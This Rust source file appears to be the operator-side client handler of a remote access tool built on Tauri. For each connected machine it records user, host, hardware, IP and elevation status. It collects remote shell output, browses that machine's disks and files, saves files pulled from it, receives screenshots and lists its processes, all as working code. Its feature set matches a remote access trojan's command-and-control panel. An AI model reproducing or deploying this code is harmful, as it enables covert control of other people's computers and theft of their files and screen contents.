use std::io::{Read,Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use base64::{engine::general_purpose, Engine as _};
use tauri::{AppHandle, Manager};

#[derive(Debug)]
pub struct Client {
    tauri_handle: Arc<Mutex<AppHandle>>,
    write_stream: TcpStream,
    read_stream: Arc<Mutex<TcpStream>>,

    username: String,
    hostname: String,
    os: String,
    ram: String,
    cpu: String,
    gpus: Vec<String>,
    storage: Vec<String>,
    displays: i32,
    ip: String,

    is_elevated: bool,

    disconnected: Arc<Mutex<bool>>,

    pub is_handled: bool,

    pub shell_started: bool,
    shell: Arc<Mutex<Vec<String>>>,

    files: Arc<Mutex<Vec<String>>>,
    folder_path: Arc<Mutex<String>>,
    process_list: Arc<Mutex<String>>,
}

impl Client {
    pub fn new(
        tauri_handle: Arc<Mutex<AppHandle>>,
        write_stream: TcpStream,
        username: String,
        hostname: String,
        os: String,
        ram: String,
        cpu: String,
        gpus: Vec<String>,
        storage: Vec<String>,
        displays: i32,
        ip: String,
        is_elevated: bool,
        shell: Arc<Mutex<Vec<String>>>,
        files: Arc<Mutex<Vec<String>>>,
        folder_path: Arc<Mutex<String>>,
        process_list: Arc<Mutex<String>>
    ) -> Self {
        Client {
            tauri_handle,
            write_stream: write_stream.try_clone().unwrap(),
            read_stream: Arc::new(Mutex::new(write_stream.try_clone().unwrap())),
            username,
            hostname,
            os,
            ram,
            cpu,
            gpus,
            storage,
            displays,
            ip,
            is_elevated,
            disconnected: Arc::new(Mutex::new(false)),
            is_handled: false,
            shell_started: false,
            shell,
            files,
            folder_path,
            process_list,
        }
    }

    pub fn write(&mut self, msg: &str) -> bool {
        let data = msg.as_bytes();

        let size = data.len() as u32;
        let size_bytes = size.to_be_bytes();

        if let Err(_) = self.write_stream.write_all(&size_bytes) {
            return false;
        }
        
        let result = self.write_stream.write_all(data);

        result.is_ok()  
    }

    pub fn handle_client(&mut self) {
        let username_clone = self.username.clone();
        let stream_clone = Arc::clone(&self.read_stream);
        let shell = Arc::clone(&self.shell);
        let files = Arc::clone(&self.files);
        let folder_path = Arc::clone(&self.folder_path);
        let disconnected = Arc::clone(&self.disconnected);
        let process_list = Arc::clone(&self.process_list);
        let tauri_handle = Arc::clone(&self.tauri_handle);
        std::thread::spawn(move || {
            loop {
                let rst = read_buffer(stream_clone.clone());
                match rst {
                    Ok(ref array) => {
                        let lines = String::from_utf8_lossy(array.as_slice())
                            .split('\n').collect::<Vec<&str>>()
                            .iter().map(|f| f.to_string())
                            .collect::<Vec<String>>();

                        for t in &lines {
                            let text = t.trim().to_string();

                            if text.starts_with("shellout:") {
                                let arr = text.split("shellout:").collect::<Vec<&str>>();
                                shell.lock().unwrap().push(arr[1].to_string());
                            }

                            if text.starts_with("file_manager||") {
                                let arr: Vec<&str> = text.split("||").collect();
                                files.lock().unwrap().push(format!("{}||{}", arr[2], arr[1]))
                            }

                            if text.starts_with("disks||") {
                                let arr: Vec<&str> = text.split("||").collect();
                                files.lock().unwrap().push(format!("{}||dir", arr[1]));
                            }

                            if text.starts_with("current_folder||") {
                                let arr: Vec<&str> = text.split("||").collect();
                                *folder_path.lock().unwrap() = arr[1].to_string();
                            }

                            if text.starts_with("downloadedfile||") {
                                let arr: Vec<&str> = text.split("||").collect();
                                let file_name = arr[1];
                                let len = 16 + file_name.len() + 2;
                                let file = &array[len..array.len()];

                                let _ = std::fs::write(file_name, file);
                            }

                            if text.starts_with("screenshot||") {
                                let img = &array[12..array.len()];
                                let vec_img: Vec<u8> = img.to_vec();
                                
                                let base64_img = general_purpose::STANDARD.encode(vec_img);

                                let _ = tauri_handle.lock().unwrap().emit_all("client_screenshot", base64_img.clone());
                            }

                            if text.starts_with("processes||") {
                                let arr: Vec<&str> = text.split("processes||").collect();
                                *process_list.lock().unwrap() = arr[1].to_string();
                            }
                        }
                    },
                    Err(_) => {
                        let _ = tauri_handle.lock().unwrap().emit_all("client_disconnected", username_clone);
                        println!("Disconnected!");
                        break;
                    }
                }
            }
            *disconnected.lock().unwrap() = true;
        });
    }

    pub fn get_username(&self) -> String {
        self.username.clone()
    }

    pub fn get_hostname(&self) -> String {
        self.hostname.clone()
    }

    pub fn get_os(&self) -> String {
        self.os.clone()
    }

    pub fn get_ram(&self) -> String {
        self.ram.clone()
    }

    pub fn get_cpu(&self) -> String {
        self.cpu.clone()
    }

    pub fn get_gpus(&self) -> Vec<String> {
        self.gpus.clone()
    }

    pub fn get_storage(&self) -> Vec<String> {
        self.storage.clone()
    }

    pub fn get_displays(&self) -> i32 {
        self.displays
    }

    pub fn get_ip(&self) -> String {
        self.ip.clone()
    }

    pub fn is_elevated(&self) -> bool {
        self.is_elevated
    }

    pub fn is_disconnect(&self) -> bool {
        *self.disconnected.lock().unwrap()
    }
}

fn read_buffer(stream: Arc<Mutex<TcpStream>>) -> std::io::Result<Vec<u8>> {
    let mut stream = stream.lock().unwrap();
    let mut size_bytes = [0_u8; 4];
    stream.read_exact(&mut size_bytes)?;

    let size = u32::from_be_bytes(size_bytes) as usize;
    let mut buffer = vec![0_u8; size];
    stream.read_exact(&mut buffer)?;

    Ok(buffer)
}